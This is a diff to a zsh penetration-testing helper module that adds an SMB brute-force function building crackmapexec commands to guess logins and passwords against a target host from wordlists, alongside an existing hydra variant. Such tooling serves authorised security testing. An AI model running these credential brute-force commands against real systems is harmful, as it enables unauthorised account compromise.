@@ -12,8 +12,8 @@ The nb-enum-smb namespace contains commands for scanning and enumerating smb ser
 
 Protocol Attacks
 ----------------
-nb-enum-smb-hydra                    brute force password/login for a user account
-nb-enum-smb-cme-spray                password spraying with cme
+nb-enum-smb-brute-hydra              brute force password/login for a user account with hydra
+nb-enum-smb-brute-cme                brute force password/login for a user account with cme
 
 Automated Enumeration tools
 -------------------------------------
@@ -107,7 +107,7 @@ nb-enum-smb-null-smbget-download-rec() {
   print -z "smbget -R smb://${__RHOST}/${__SHARE}"
 }
 
-nb-enum-smb-hydra() {
+nb-enum-smb-brute-hydra() {
     __check-project
     nb-vars-set-rhost
 
@@ -161,7 +161,40 @@ nb-enum-smb-hydra() {
       fi
     else
       echo
-      __err "Invalid option. Please choose 'p' for password or 'l' for login."
+      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
+    fi
+}
+
+nb-enum-smb-brute-cme() {
+    __check-project
+    nb-vars-set-rhost
+
+    __ask "You wanna brute force login/password/both? (l/p/b)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+      nb-vars-set-user
+      print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '${__PASSLIST}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute.txt"
+    elif [[ $login == "l" ]]; then
+      nb-vars-set-wordlist
+      nb-vars-set-pass
+      print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASS}' --local-auth --continue-on-success"
+    elif [[ $login == "b" ]]; then
+      __ask "Do you wanna manually specify wordlists? (y/n)"
+      local sw && __askvar sw "SPECIFY_WORDLIST"
+      if [[ $sw == "y" ]]; then
+        __ask "Select a user list"
+        __askpath ul FILE $HOME/desktop/projects/
+        __ask "Select a password list"
+        __askpath pl FILE $HOME/desktop/projects/
+        print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute.txt"
+      else
+        nb-vars-set-wordlist
+        print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASSLIST}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute.txt"
+      fi
+    else
+      echo
+      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
     fi
 }
 
